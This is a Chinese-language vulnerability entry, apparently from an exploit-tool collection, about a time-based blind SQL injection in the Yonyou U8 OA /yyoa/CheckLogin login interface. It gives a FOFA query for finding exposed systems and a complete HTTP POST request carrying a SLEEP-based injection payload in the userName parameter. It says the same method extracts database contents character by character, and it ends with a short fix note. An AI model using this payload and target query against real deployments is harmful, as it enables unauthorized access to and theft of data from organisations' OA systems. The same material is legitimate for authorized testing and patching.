---
fofa: "app=\"用友-NC-Cloud\""
source: "OA-EXPTOOL/Lucifer1993"
---

# 用友U8-OA CheckLogin SQL注入漏洞

# 漏洞描述

用友 U8 OA 系统 `/yyoa/CheckLogin` 登录接口存在 SQL 注入漏洞，`userName` 参数拼接时间盲注语句即可判断注入并逐字提取数据库敏感信息。

注：来源 YAML（OA-EXPTOOL/book/yonyou/）将本条目标注为"用友OA"，其描述字段中"北京致远互联"字样系工具作者复制粘贴笔误；`/yyoa/` 为用友 U8 OA 上下文路径，故归入用友 GRP-U8。

# 影响版本

用友 U8 OA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-NC-Cloud"

POC/EXP：

```
POST /yyoa/CheckLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(0)))sHcE) AND 'wert'='wert&password=11
```

通过 userName 参数中的时间盲注语句（SLEEP）判断注入是否成功，进而可逐字提取数据库敏感信息。

# 漏洞修复

联系厂商获取安全补丁，对 userName 等登录参数使用预编译语句并做严格过滤。
